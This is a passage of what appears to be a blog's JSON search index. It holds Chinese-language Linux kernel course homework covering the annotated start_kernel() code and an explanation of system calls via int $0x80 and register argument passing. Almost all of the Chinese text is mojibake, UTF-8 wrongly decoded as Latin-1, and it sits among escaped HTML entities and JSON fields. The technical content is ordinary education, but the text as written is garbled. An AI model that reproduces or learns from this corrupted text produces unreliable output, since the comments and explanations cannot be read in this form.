//å…³é—­ä¼˜å…ˆçº§è°ƒåº¦ã€‚ç”±äºæ¯ä¸ªè¿›ç¨‹ä»»åŠ¡éƒ½æœ‰ä¼˜å…ˆçº§ï¼Œç›®å‰ç³»ç»Ÿè¿˜æ²¡æœ‰å®Œå…¨åˆå§‹åŒ–ï¼Œè¿˜ä¸èƒ½æ‰“å¼€ä¼˜å…ˆçº§è°ƒåº¦ã€‚ build_all_zonelists(); page_alloc_init(); //è®¾ç½®å†…å­˜é¡µåˆ†é…é€šçŸ¥å™¨ printk(KERN_NOTICE \u0026quot;Kernel command line: %s\\n\u0026quot;, saved_command_line); //è¾“å‡ºå‘½ä»¤å‚æ•°åˆ°æ˜¾ç¤ºç»ˆç«¯ parse_early_param(); //è§£æcmdlineä¸­çš„å¯åŠ¨å‚æ•° parse_args(\u0026quot;Booting kernel\u0026quot;, command_line, __start___param, __stop___param - __start___param, \u0026amp;unknown_bootoption); //è¿™è¡Œä»£ç ä¸»è¦å¯¹ä¼ å…¥å†…æ ¸å‚æ•°è¿›è¡Œè§£é‡Šï¼Œå¦‚æœä¸èƒ½è¯†åˆ«çš„å‘½ä»¤å°±è°ƒç”¨æœ€åå‚æ•°çš„å‡½æ•° sort_main_extable();//å¯¹å†…æ ¸å¼‚å¸¸è¡¨(exception table)æŒ‰ç…§å¼‚å¸¸å‘é‡å·å¤§å°è¿›è¡Œæ’åºï¼Œä»¥ä¾¿åŠ é€Ÿè®¿é—® trap_init(); //å¯¹å†…æ ¸é™·é˜±å¼‚å¸¸è¿›è¡Œåˆå§‹åŒ–ï¼Œåˆå§‹åŒ–ä¸€äº›ä¸­æ–­å‘é‡ï¼Œåœ¨ARMç³»ç»Ÿé‡Œæ˜¯ç©ºå‡½æ•°ï¼Œæ²¡æœ‰ä»»ä½•çš„åˆå§‹åŒ– rcu_init(); //åˆå§‹åŒ–ç›´æ¥è¯»æ‹·è´æ›´æ–°çš„é”æœºåˆ¶ã€‚ Read-Copy Update ã€RCUä¸»è¦æä¾›åœ¨è¯»å–æ•°æ®æœºä¼šæ¯”è¾ƒå¤šï¼Œä½†æ›´æ–°æ¯”è¾ƒçš„å°‘çš„åœºåˆï¼Œè¿™æ ·å‡å°‘è¯»å–æ•°æ®é”çš„æ€§èƒ½ä½ä¸‹çš„é—®é¢˜ã€‚ã€‘ init_IRQ();\u0026lt;span style=\u0026quot;white-space:pre\u0026quot;\u0026gt;\t\u0026lt;/span\u0026gt;//å¯¹åº”æ¶æ„ç‰¹å®šçš„ä¸­æ–­åˆå§‹åŒ–å‡½æ•°ï¼Œåœ¨ARMä¸­å°±æ˜¯machine_desc-\u0026gt;init_irq()ï¼Œå°±æ˜¯è¿è¡Œè®¾å¤‡æè¿°ç»“æ„ä½“ä¸­çš„init_irqå‡½æ•°[arch/arm/mach-msm/board-xxx.c] pidhash_init(); init_timers();\u0026lt;span style=\u0026quot;white-space:pre\u0026quot;\u0026gt;\t\u0026lt;/span\u0026gt; //åˆå§‹åŒ–å¼•å¯¼CPUçš„æ—¶é’Ÿç›¸å…³çš„æ•°æ®ç»“æ„ï¼Œæ³¨å†Œæ—¶é’Ÿçš„å›è°ƒå‡½æ•°ï¼Œå½“æ—¶é’Ÿåˆ°è¾¾æ—¶å¯ä»¥å›è°ƒæ—¶é’Ÿå¤„ç†å‡½æ•°ï¼Œæœ€ååˆå§‹åŒ–æ—¶é’Ÿè½¯ä»¶ä¸­æ–­å¤„ç† //åˆå§‹åŒ–å®šæ—¶å™¨,å¼€å¯å®šæ—¶å™¨è½¯ä¸­æ–­æœåŠ¡ä»¥åŠæ³¨å†ŒæœåŠ¡ç¨‹åºä»¥åŠåˆå§‹åŒ–å„CPUä¸­çš„tev_baseç­‰init_timers()-\u0026gt;run_timer_softirq()-\u0026gt;__run_timers().. softirq_init(); //åˆå§‹åŒ–è½¯ä»¶ä¸­æ–­ï¼Œè½¯ä»¶ä¸­æ–­ä¸ç¡¬ä»¶ä¸­æ–­åŒºåˆ«å°±æ˜¯ä¸­æ–­å‘ç”Ÿæ—¶ï¼Œè½¯ä»¶ä¸­æ–­æ˜¯ä½¿ç”¨çº¿ç¨‹æ¥ç›‘è§†ä¸­æ–­ä¿¡å·ï¼Œè€Œç¡¬ä»¶ä¸­æ–­æ˜¯ä½¿ç”¨CPUç¡¬ä»¶æ¥ç›‘è§†ä¸­æ–­ã€‚ time_init(); //åˆå§‹åŒ–ç³»ç»Ÿæ—¶é’Ÿã€‚å¼€å¯ä¸€ä¸ªç¡¬ä»¶å®šæ—¶å™¨ï¼Œå¼€å§‹äº§ç”Ÿç³»ç»Ÿæ—¶é’Ÿå°±æ˜¯system_timerçš„åˆå§‹åŒ–,arch/arm/mach-msm/board-*.c console_init(); if (panic_later) panic(panic_later, panic_param); profile_init(); local_irq_enable(); #ifdef CONFIG_BLK_DEV_INITRD if (initrd_start \u0026amp;\u0026amp; !initrd_below_start_ok \u0026amp;\u0026amp; initrd_start \u0026lt; min_low_pfn \u0026lt;\u0026lt; PAGE_SHIFT) { printk(KERN_CRIT \u0026quot;initrd overwritten (0x%08lx \u0026lt; 0x%08lx) - \u0026quot; \u0026quot;disabling it.\\n\u0026quot;,initrd_start,min_low_pfn \u0026lt;\u0026lt; PAGE_SHIFT); initrd_start = 0; } #endif vfs_caches_init_early(); //å‰æœŸè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ(vfs)çš„ç¼“å­˜åˆå§‹åŒ– mem_init(); //åˆå§‹åŒ–å†…å­˜å¹¶è®¡ç®—å¯ç”¨å†…å­˜å¤§å°;æ ‡è®°å“ªäº›å†…å­˜å¯ä»¥ä½¿ç”¨ï¼Œå¹¶ä¸”å‘Šè¯‰ç³»ç»Ÿæœ‰å¤šå°‘å†…å­˜å¯ä»¥ä½¿ç”¨ï¼Œå½“ç„¶æ˜¯é™¤äº†å†…æ ¸ä½¿ç”¨çš„å†…å­˜ä»¥å¤– kmem_cache_init(); // åˆå§‹åŒ–SLABç¼“å­˜åˆ†é…å™¨ setup_per_cpu_pageset(); numa_policy_init(); if (late_time_init) late_time_init(); calibrate_delay(); pidmap_init(); //è¿›ç¨‹å·ä½å›¾åˆå§‹åŒ–ï¼Œä¸€èˆ¬ç”¨ä¸€ä¸ªpageæ¥æŒ‡ç¤ºæ‰€æœ‰çš„è¿›ç¨‹PIDå ç”¨æƒ…å†µ pgtable_cache_init(); prio_tree_init(); //åˆå§‹åŒ–å†…æ ¸åŸºäºradixæ ‘çš„ä¼˜å…ˆçº§æœç´¢æ ‘(PST)ï¼Œåˆå§‹åŒ–ç»“æ„ä½“ anon_vma_init(); //åˆå§‹åŒ–åå‘æ˜ å°„çš„åŒ¿åå†…å­˜ï¼Œæä¾›åå‘æŸ¥æ‰¾å†…å­˜çš„ç»“æ„æŒ‡é’ˆä½ç½®ï¼Œå¿«é€Ÿåœ°å›æ”¶å†…å­˜ã€‚ #ifdef CONFIG_X86 if (efi_enabled) efi_enter_virtual_mode(); #endif fork_init(num_physpages); //åˆå§‹åŒ–kernelçš„fork()ç¯å¢ƒã€‚Linuxä¸‹åº”ç”¨ç¨‹åºæ‰§è¡Œæ˜¯é ç³»ç»Ÿè°ƒç”¨fork()å®Œæˆï¼Œfork_initæ‰€å®Œæˆçš„å·¥ä½œå°±æ˜¯ç¡®å®šå¯ä»¥fork()çš„çº¿ç¨‹çš„æ•°é‡ï¼Œç„¶åæ˜¯åˆå§‹åŒ–init_taskè¿›ç¨‹ proc_caches_init(); //è¿›ç¨‹ç¼“å­˜åˆå§‹åŒ–ï¼Œä¸ºè¿›ç¨‹åˆå§‹åŒ–åˆ›å»ºæœºåˆ¶æ‰€éœ€çš„å…¶ä»–æ•°æ®ç»“æ„ç”³è¯·ç©ºé—´ buffer_init(); //åˆå§‹åŒ–æ–‡ä»¶ç³»ç»Ÿçš„ç¼“å†²åŒºï¼Œå¹¶è®¡ç®—æœ€å¤§å¯ä»¥ä½¿ç”¨çš„æ–‡ä»¶ç¼“å­˜ã€‚ unnamed_dev_init(); //åˆå§‹åŒ–ä¸€ä¸ªè™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿä½¿ç”¨çš„å“‘æ–‡ä»¶ key_init(); //æ²¡æœ‰é”®ç›˜åˆ™ä¸ºç©ºï¼Œå¦‚æœæœ‰é”®ç›˜ï¼Œåˆ™ä¸ºé”®ç›˜åˆ†é…ä¸€ä¸ªé«˜é€Ÿç¼“å­˜ security_init(); vfs_caches_init(num_physpages); //åˆå§‹åŒ–è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿ radix_tree_init(); signals_init(); //åˆå§‹åŒ–å†…æ ¸ä¿¡å·é˜Ÿåˆ—â€¦. page_writeback_init(); //é¡µé¢å†™æœºåˆ¶åˆå§‹åŒ– #ifdef CONFIG_PROC_FS proc_root_init(); //åˆå§‹åŒ–ç³»ç»Ÿè¿›ç¨‹æ–‡ä»¶ç³»ç»Ÿï¼Œä¸»è¦æä¾›å†…æ ¸ä¸ç”¨æˆ·è¿›è¡Œäº¤äº’çš„å¹³å°ï¼Œæ–¹ä¾¿ç”¨æˆ·å®æ—¶æŸ¥çœ‹è¿›ç¨‹çš„ä¿¡æ¯ã€‚ #endif cpuset_init(); //åˆå§‹åŒ–CPUSETï¼ŒCPUSETä¸»è¦ä¸ºæ§åˆ¶ç»„æä¾›CPUå’Œå†…å­˜èŠ‚ç‚¹çš„ç®¡ç†çš„ç»“æ„ã€‚ check_bugs(); //æ£€æŸ¥CPUé…ç½®ã€FPUç­‰æ˜¯å¦éæ³•ä½¿ç”¨ä¸å…·å¤‡çš„åŠŸèƒ½ï¼Œæ£€æŸ¥CPU BUGï¼Œè½¯ä»¶è§„é¿BUG acpi_early_init(); /* before LAPIC and SMP init */ rest_init(); //æœ€åå®é™…è¿›å…¥reset_init()å‡½æ•°ï¼ŒåŒ…æ‹¬æ‰€æœ‰å‰©ä¸‹çš„ç¡¬ä»¶é©±åŠ¨ï¼Œçº¿ç¨‹åˆå§‹åŒ–ç­‰è¿‡ç¨‹â€¦è¿™ä¹Ÿæœ€ç»ˆå®Œæˆstart_kernelçš„å¯åŠ¨è¿‡ç¨‹ã€‚ }\u0026lt;/span\u0026gt; æ¥ä¸‹æ¥åˆ†æinitè¿›ç¨‹çš„åˆ›å»ºå’Œæ‰§è¡Œï¼š start_kernel() -\u0026gt; rest_init() -\u0026gt; kernel_init() -\u0026gt; å¯åŠ¨initè¿›ç¨‹;\nrest_initå‡½æ•°ä¸­åˆ›å»ºçš„ä¸€ä¸ªå†…æ ¸çº¿ç¨‹kernel_initï¼Œè°ƒç”¨è¯¥å†…æ ¸çº¿ç¨‹ä¹‹åï¼Œè¯¥çº¿ç¨‹è¦å®Œæˆçš„ä»»åŠ¡æ˜¯å¯åŠ¨initè¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ‰€è°“çš„ï¼‘å·è¿›ç¨‹ï¼Œæ˜¯ç³»ç»Ÿå¯åŠ¨åçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ã€‚å¤§è‡´å¯å¦‚ä¸‹è¡¨ç¤ºï¼š 0å·è¿›ç¨‹(rest_init)-\u0026gt;1å·å†…æ ¸è¿›ç¨‹ï¼ˆkernel_initï¼‰-\u0026gt;1å·ç”¨æˆ·è¿›ç¨‹ï¼ˆinitè¿›ç¨‹ï¼‰ åŒæ—¶ï¼å·è¿›ç¨‹rest_initä¸­æœ€åä¼šè°ƒç”¨ä¸€ä¸ªidleçš„è¿›ç¨‹ï¼Œidleè¿›ç¨‹æ˜¯åœ¨ç³»ç»Ÿä¸­æ²¡æœ‰ä»»ä½•ä»»åŠ¡æ‰§è¡Œçš„æ—¶å€™ï¼Œè¯¥ä»»åŠ¡å¼€å§‹å·¥ä½œã€‚\nå®éªŒï¼šå†…æ ¸è°ƒè¯• ","date":1425215067,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1425215067,"objectID":"d20ffec379ce9d586a2719451d126908","permalink":"http://www.guozet.me/post/Linux-Kernel-analysis-Start-Kernel-Function/","publishdate":"2015-03-01T13:04:27Z","relpermalink":"/post/Linux-Kernel-analysis-Start-Kernel-Function/","section":"post","summary":"Linuxå†…æ ¸è¯¾ç¬¬ä¸‰å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\n","tags":"Linux kernel","title":"Linuxå†…æ ¸åˆ†æè¯¾ç¨‹3_start_kernel()å‡½æ•°åˆ†æ","type":"post"},{"authors":null,"categories":"Linux","content":"Linuxå†…æ ¸è¯¾ç¬¬å››å‘¨ä½œä¸šã€‚æœ¬æ–‡åœ¨äº‘è¯¾å ‚ä¸­å®éªŒæ¥¼å®Œæˆã€‚\nå”å›½æ³½ åŸåˆ›ä½œå“è½¬è½½è¯·æ³¨æ˜å‡ºå¤„.\nã€ŠLinuxå†…æ ¸åˆ†æã€‹MOOCè¯¾ç¨‹\nä¸»è¦å†…å®¹ï¼š\nLinuxç³»ç»Ÿè°ƒç”¨çš„åŸç† ç³»ç»Ÿè°ƒç”¨çš„å®ç°ä¸æ„ä¹‰ APIå’Œç³»ç»Ÿè°ƒç”¨ ç³»ç»Ÿè°ƒç”¨ç¨‹åºåŠæœåŠ¡ä¾‹ç¨‹ å®éªŒï¼šä½¿ç”¨Cè¯­è¨€å’Œæ±‡ç¼–åˆ†åˆ«è¿›è¡Œç³»ç»Ÿè°ƒç”¨ Linuxç³»ç»Ÿè°ƒç”¨çš„åŸç† ç³»ç»Ÿè°ƒç”¨ï¼Œé¡¾åæ€ä¹‰ï¼Œè¯´çš„æ˜¯æ“ä½œç³»ç»Ÿæä¾›ç»™ç”¨æˆ·ç¨‹åºè°ƒç”¨çš„ä¸€ç»„â€œç‰¹æ®Šâ€æ¥å£ã€‚ç”¨æˆ·ç¨‹åºå¯ä»¥é€šè¿‡è¿™ç»„â€œç‰¹æ®Šâ€æ¥å£æ¥è·å¾—æ“ä½œç³»ç»Ÿå†…æ ¸æä¾›çš„æœåŠ¡ï¼Œæ¯”å¦‚ç”¨æˆ·å¯ä»¥é€šè¿‡æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„è°ƒç”¨è¯·æ±‚ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶ã€å…³é—­æ–‡ä»¶æˆ–è¯»å†™æ–‡ä»¶ï¼Œå¯ä»¥é€šè¿‡æ—¶é’Ÿç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨è·å¾—ç³»ç»Ÿæ—¶é—´æˆ–è®¾ç½®å®šæ—¶å™¨ç­‰ã€‚\nä»é€»è¾‘ä¸Šæ¥è¯´ï¼Œç³»ç»Ÿè°ƒç”¨å¯è¢«çœ‹æˆæ˜¯ä¸€ä¸ªå†…æ ¸ä¸ç”¨æˆ·ç©ºé—´ç¨‹åºäº¤äº’çš„æ¥å£â€”â€”å®ƒå¥½æ¯”ä¸€ä¸ªä¸­é—´äººï¼ŒæŠŠç”¨æˆ·è¿›ç¨‹çš„è¯·æ±‚ä¼ è¾¾ç»™å†…æ ¸ï¼Œå¾…å†…æ ¸æŠŠè¯·æ±‚å¤„ç†å®Œæ¯•åå†å°†å¤„ç†ç»“æœé€å›ç»™ç”¨æˆ·ç©ºé—´ã€‚\nç³»ç»ŸæœåŠ¡ä¹‹æ‰€ä»¥éœ€è¦é€šè¿‡ç³»ç»Ÿè°ƒç”¨æ¥æä¾›ç»™ç”¨æˆ·ç©ºé—´çš„æ ¹æœ¬åŸå› æ˜¯ä¸ºäº†å¯¹ç³»ç»Ÿè¿›è¡Œâ€œä¿æŠ¤â€ï¼Œå› ä¸ºæˆ‘ä»¬çŸ¥é“Linuxçš„è¿è¡Œç©ºé—´åˆ†ä¸ºå†…æ ¸ç©ºé—´ä¸ç”¨æˆ·ç©ºé—´ï¼Œå®ƒä»¬å„è‡ªè¿è¡Œåœ¨ä¸åŒçš„çº§åˆ«ä¸­ï¼Œé€»è¾‘ä¸Šç›¸äº’éš”ç¦»ã€‚æ‰€ä»¥ç”¨æˆ·è¿›ç¨‹åœ¨é€šå¸¸æƒ…å†µä¸‹ä¸å…è®¸è®¿é—®å†…æ ¸æ•°æ®ï¼Œä¹Ÿæ— æ³•ä½¿ç”¨å†…æ ¸å‡½æ•°ï¼Œå®ƒä»¬åªèƒ½åœ¨ç”¨æˆ·ç©ºé—´æ“ä½œç”¨æˆ·æ•°æ®ï¼Œè°ƒç”¨ç”¨æˆ·ç©ºé—´å‡½æ•°ã€‚æ¯”å¦‚æˆ‘ä»¬ç†Ÿæ‚‰çš„â€œhello worldâ€ç¨‹åºï¼ˆæ‰§è¡Œæ—¶ï¼‰å°±æ˜¯æ ‡å‡†çš„ç”¨æˆ·ç©ºé—´è¿›ç¨‹ï¼Œå®ƒä½¿ç”¨çš„æ‰“å°å‡½æ•°printfå°±å±äºç”¨æˆ·ç©ºé—´å‡½æ•°ï¼Œæ‰“å°çš„å­—ç¬¦â€œhello wordâ€å­—ç¬¦ä¸²ä¹Ÿå±äºç”¨æˆ·ç©ºé—´æ•°æ®ã€‚\nä½†æ˜¯å¾ˆå¤šæƒ…å†µä¸‹ï¼Œç”¨æˆ·è¿›ç¨‹éœ€è¦è·å¾—ç³»ç»ŸæœåŠ¡ï¼ˆè°ƒç”¨ç³»ç»Ÿç¨‹åºï¼‰ï¼Œè¿™æ—¶å°±å¿…é¡»åˆ©ç”¨ç³»ç»Ÿæä¾›ç»™ç”¨æˆ·çš„â€œç‰¹æ®Šæ¥å£â€â€”â€”ç³»ç»Ÿè°ƒç”¨äº†ï¼Œå®ƒçš„ç‰¹æ®Šæ€§ä¸»è¦åœ¨äºè§„å®šäº†ç”¨æˆ·è¿›ç¨‹è¿›å…¥å†…æ ¸çš„å…·ä½“ä½ç½®ï¼›æ¢å¥è¯è¯´ï¼Œç”¨æˆ·è®¿é—®å†…æ ¸çš„è·¯å¾„æ˜¯äº‹å…ˆè§„å®šå¥½çš„ï¼Œåªèƒ½ä»è§„å®šä½ç½®è¿›å…¥å†…æ ¸ï¼Œè€Œä¸å‡†è®¸è‚†æ„è·³å…¥å†…æ ¸ã€‚æœ‰äº†è¿™æ ·çš„é™·å…¥å†…æ ¸çš„ç»Ÿä¸€è®¿é—®è·¯å¾„é™åˆ¶æ‰èƒ½ä¿è¯å†…æ ¸å®‰å…¨æ— è™ã€‚æˆ‘ä»¬å¯ä»¥å½¢è±¡åœ°æè¿°è¿™ç§æœºåˆ¶ï¼šä½œä¸ºä¸€ä¸ªæ¸¸å®¢ï¼Œä½ å¯ä»¥ä¹°ç¥¨è¦æ±‚è¿›å…¥é‡ç”ŸåŠ¨ç‰©å›­ï¼Œä½†ä½ å¿…é¡»è€è€å®å®åœ°ååœ¨è§‚å…‰è½¦ä¸Šï¼ŒæŒ‰ç…§è§„å®šçš„è·¯çº¿è§‚å…‰æ¸¸è§ˆã€‚å½“ç„¶ï¼Œä¸å‡†ä¸‹è½¦ï¼Œå› ä¸ºé‚£æ ·å¤ªå±é™©ï¼Œä¸æ˜¯è®©ä½ ä¸¢æ‰å°å‘½ï¼Œå°±æ˜¯è®©ä½ å“åäº†é‡ç”ŸåŠ¨ç‰©ã€‚\nè¯¥æ®µå¼•ç”¨è‡ªåšå®¢ï¼š Linuxç³»ç»Ÿè°ƒç”¨\nç³»ç»Ÿè°ƒç”¨çš„å®ç°å’Œæ„ä¹‰ Linuxç³»ç»Ÿè°ƒç”¨æ˜¯é€šè¿‡è½¯ä¸­æ–­æ¥å®ç°çš„ï¼Œè½¯ä¸­æ–­æ˜¯æœ‰ç¼–ç¨‹äººå‘˜åœ¨è½¯ä»¶ä¸­è¿›è¡Œè§¦å‘çš„ï¼ˆæ³¨æ„åŒºåˆ«ä¸ç¡¬ä»¶ä¸­æ–­ï¼‰ï¼›åœ¨ä»£ç ä¸­çš„ä½“ç°æ˜¯é€šè¿‡int $0x80æ±‡ç¼–æŒ‡ä»¤æ¥è§¦å‘ç¼–ç¨‹å¼‚å¸¸ï¼›\né‚£ä¸ºä»€ä¹ˆè¦å¼„ä¸€ä¸ªå¼‚å¸¸æœºåˆ¶å‘¢ï¼Ÿ å› ä¸ºå½“ç”¨æˆ·æ€çš„è¿›ç¨‹è°ƒç”¨ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æ—¶ï¼ŒCPUä¾¿è¢«åˆ‡æ¢åˆ°å†…æ ¸æ€æ‰§è¡Œå†…æ ¸å‡½æ•°ï¼Œè€Œæˆ‘ä»¬åœ¨i386ä½“ç³»ç»“æ„éƒ¨åˆ†å·²ç»è®²è¿°è¿‡äº†è¿›å…¥å†…æ ¸â€”â€”è¿›å…¥é«˜ç‰¹æƒçº§åˆ«â€”â€”å¿…é¡»ç»è¿‡ç³»ç»Ÿçš„é—¨æœºåˆ¶ï¼Œè¿™é‡Œçš„å¼‚å¸¸å®é™…ä¸Šå°±æ˜¯é€šè¿‡ç³»ç»Ÿé—¨é™·å…¥å†…æ ¸ã€‚\nè¯¦ç»†åœ°è§£é‡Šä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ã€‚int $0x80æŒ‡ä»¤çš„ç›®çš„æ˜¯äº§ç”Ÿä¸€ä¸ªç¼–å·ä¸º0x80çš„ç¼–ç¨‹å¼‚å¸¸ï¼Œè¿™ä¸ªç¼–ç¨‹å¼‚å¸¸å¯¹åº”çš„æ˜¯ä¸­æ–­æè¿°ç¬¦è¡¨IDTä¸­çš„ç¬¬128é¡¹â€”â€”ä¹Ÿå°±æ˜¯å¯¹åº”çš„ç³»ç»Ÿé—¨æè¿°ç¬¦ã€‚é—¨æè¿°ç¬¦ä¸­å«æœ‰ä¸€ä¸ªé¢„è®¾çš„å†…æ ¸ç©ºé—´åœ°å€ï¼Œå®ƒæŒ‡å‘äº†ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åºï¼šsystem_call()ï¼ˆåˆ«å’Œç³»ç»Ÿè°ƒç”¨æœåŠ¡ç¨‹åºæ··æ·†,è¿™ä¸ªç¨‹åºåœ¨entry.Sæ–‡ä»¶ä¸­ç”¨æ±‡ç¼–è¯­è¨€ç¼–å†™ï¼‰ã€‚\nå¾ˆæ˜¾ç„¶ï¼Œæ‰€æœ‰çš„ç³»ç»Ÿè°ƒç”¨éƒ½ä¼šç»Ÿä¸€åœ°è½¬åˆ°è¿™ä¸ªåœ°å€ï¼Œä½†Linuxä¸€å…±æœ‰256ç³»ç»Ÿè°ƒç”¨éƒ½ä»è¿™é‡Œè¿›å…¥å†…æ ¸ååˆè¯¥å¦‚ä½•æ´¾å‘åˆ°å®ƒä»¬åˆ°å„è‡ªçš„æœåŠ¡ç¨‹åºå»å‘¢ï¼Ÿ\nè§£å†³è¿™ä¸ªé—®é¢˜çš„æ–¹æ³•éå¸¸ç®€å•ï¼šé¦–å…ˆLinuxä¸ºæ¯ä¸ªç³»ç»Ÿè°ƒç”¨éƒ½è¿›è¡Œäº†ç¼–å·ï¼ˆ0â€”NR_syscallï¼‰ï¼ŒåŒæ—¶åœ¨å†…æ ¸ä¸­ä¿å­˜äº†ä¸€å¼ ç³»ç»Ÿè°ƒç”¨è¡¨ï¼Œè¯¥è¡¨ä¸­ä¿å­˜äº†ç³»ç»Ÿè°ƒç”¨ç¼–å·å’Œå…¶å¯¹åº”çš„æœåŠ¡ä¾‹ç¨‹ï¼Œå› æ­¤åœ¨ç³»ç»Ÿè°ƒå…¥é€šè¿‡ç³»ç»Ÿé—¨é™·å…¥å†…æ ¸å‰ï¼Œéœ€è¦æŠŠç³»ç»Ÿè°ƒç”¨å·ä¸€å¹¶ä¼ å…¥å†…æ ¸ï¼Œåœ¨x86ä¸Šï¼Œè¿™ä¸ªä¼ é€’åŠ¨ä½œæ˜¯é€šè¿‡åœ¨æ‰§è¡Œint0x80å‰æŠŠè°ƒç”¨å·è£…å…¥eaxå¯„å­˜å™¨å®ç°çš„ã€‚è¿™æ ·ç³»ç»Ÿè°ƒç”¨å¤„ç†ç¨‹åºä¸€æ—¦è¿è¡Œï¼Œå°±å¯ä»¥ä»eaxä¸­å¾—åˆ°æ•°æ®ï¼Œç„¶åå†å»ç³»ç»Ÿè°ƒç”¨è¡¨ä¸­å¯»æ‰¾ç›¸åº”æœåŠ¡ä¾‹ç¨‹äº†ã€‚\né‚£ä¹ˆï¼Œè°ƒç”¨æ—¶å€™çš„å‚æ•°æ˜¯å¦‚ä½•ä¼ é€’çš„å‘¢ï¼Ÿ\nä¼ é€’çš„å‚æ•°ä¸»è¦æœ‰ï¼š\nå®é™…çš„å€¼ï¼› ç”¨æˆ·æ€è¿›ç¨‹åœ°å€ç©ºé—´çš„å˜é‡çš„åœ°å€ï¼› ç”šè‡³æ˜¯åŒ…å«æŒ‡å‘ç”¨æˆ·æ€å‡½æ•°çš„æŒ‡é’ˆçš„æ•°æ®ç»“æ„çš„åœ°å€ï¼› å¯„å­˜å™¨ä¼ é€’å‚æ•°å…·æœ‰å¦‚ä¸‹é™åˆ¶ï¼š\næ¯ä¸ªå‚æ•°çš„é•¿åº¦ä¸èƒ½è¶…è¿‡å¯„å­˜å™¨çš„é•¿åº¦ï¼Œå³32ä½ åœ¨ç³»ç»Ÿè°ƒç”¨å·ï¼ˆeaxï¼‰ä¹‹å¤–ï¼Œå‚æ•°çš„ä¸ªæ•°ä¸èƒ½è¶…è¿‡6ä¸ªï¼ˆebxï¼Œecxï¼Œedxï¼Œesiï¼Œediï¼Œebpï¼‰ è¶…è¿‡6ä¸ªæ€ä¹ˆåŠï¼Ÿè¶…è¿‡ï¼–ä¸ªçš„è¯ï¼Œå¯å°†å…¶æ”¾åˆ°å†…å­˜ä¸­ï¼ŒæŠŠå†…å­˜åœ°å€ä¼ é€’è¿‡å»å³å¯ï¼› ç³»ç»Ÿè°ƒç”¨è¿‡ç¨‹å¦‚ä¸‹æ‰€ç¤ºï¼š æ€»ç»“ï¼šç³»ç»Ÿè°ƒç”¨ï¼Œç®€è€Œè¨€ä¹‹ï¼Œå°±æ˜¯è½¯ä»¶é€šè¿‡è°ƒç”¨APIï¼Œç”±APIè°ƒç”¨int $0x80 è§¦å‘è½¯ä»¶ä¸­æ–­ï¼Œç„¶åé€šè¿‡ä¸€äº›å¯„å­˜å™¨å°†å‚æ•°ä¼ å…¥ï¼Œå®ç°ä¸€äº›ç¡¬ä»¶çš„æ“ä½œã€‚\né‚£è®¾ç½®ç³»ç»Ÿè°ƒç”¨çš„æ„ä¹‰ä½•åœ¨å‘¢ï¼Ÿ\næ“ä½œç³»ç»Ÿä¸ºç”¨æˆ·æ€è¿›ç¨‹ä¸ç¡¬ä»¶è®¾å¤‡è¿›è¡Œäº¤äº’æä¾›äº†ä¸€ç»„æ¥å£â€”â€”ç³»ç»Ÿè°ƒç”¨\næŠŠç”¨æˆ·ä»åº•å±‚çš„ç¡¬ä»¶ç¼–ç¨‹ä¸­è§£æ”¾å‡ºæ¥ æå¤§çš„æé«˜äº†ç³»ç»Ÿçš„å®‰å…¨æ€§ ä½¿ç”¨æˆ·ç¨‹åºå…·æœ‰å¯ç§»æ¤æ€§ APIï¼Œç³»ç»Ÿè°ƒç”¨ï¼Œç³»ç»Ÿå‘½ä»¤ï¼Œå†…æ ¸å‡½æ•° åº”ç”¨ç¼–ç¨‹æ¥å£(application program interface, API)æ˜¯ä¸€ä¸ªå‡½æ•°å®šä¹‰ï¼Œè¯´æ˜äº†å¦‚ä½•è·å¾—ä¸€ä¸ªç»™å®šçš„æœåŠ¡ï¼Œæ¯”å¦‚read( )ã€malloc( )ã€free( )ã€abs( )ç­‰ã€‚å®ƒæœ‰å¯èƒ½å’Œç³»ç»Ÿè°ƒç”¨å½¢å¼ä¸Šä¸€è‡´ï¼Œæ¯”å¦‚read()æ¥å£å°±å’Œreadç³»ç»Ÿè°ƒç”¨å¯¹åº”ï¼Œä½†è¿™ç§å¯¹åº”å¹¶éä¸€ä¸€å¯¹åº”ï¼Œå¾€å¾€ä¼šå‡ºç°å‡ ç§ä¸åŒçš„APIå†…éƒ¨ç”¨åˆ°åŒä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œæ¯”å¦‚malloc( )ã€free( )å†…éƒ¨åˆ©ç”¨brk( )ç³»ç»Ÿè°ƒç”¨æ¥æ‰©å¤§æˆ–ç¼©å°è¿›ç¨‹çš„å †ï¼›æˆ–ä¸€ä¸ªAPIåˆ©ç”¨äº†å¥½å‡ ä¸ªç³»ç»Ÿè°ƒç”¨ç»„åˆå®ŒæˆæœåŠ¡ã€‚æ›´æœ‰äº›APIç”šè‡³ä¸éœ€è¦ä»»ä½•ç³»ç»Ÿè°ƒç”¨â€”â€”å› ä¸ºå®ƒå¹¶ä¸æ˜¯å¿…éœ€è¦ä½¿ç”¨å†…æ ¸æœåŠ¡ï¼Œå¦‚è®¡ç®—æ•´æ•°ç»å¯¹å€¼çš„absï¼ˆï¼‰æ¥å£\nç³»ç»Ÿè°ƒç”¨å¹¶éç›´æ¥å’Œç¨‹åºå‘˜æˆ–ç³»ç»Ÿç®¡ç†å‘˜æ‰“äº¤é“ï¼Œå®ƒä»…ä»…æ˜¯ä¸€ä¸ªé€šè¿‡è½¯ä¸­æ–­æœºåˆ¶ï¼ˆæˆ‘ä»¬åé¢è®²è¿°ï¼‰å‘å†…æ ¸æäº¤è¯·æ±‚ï¼Œè·å–å†…æ 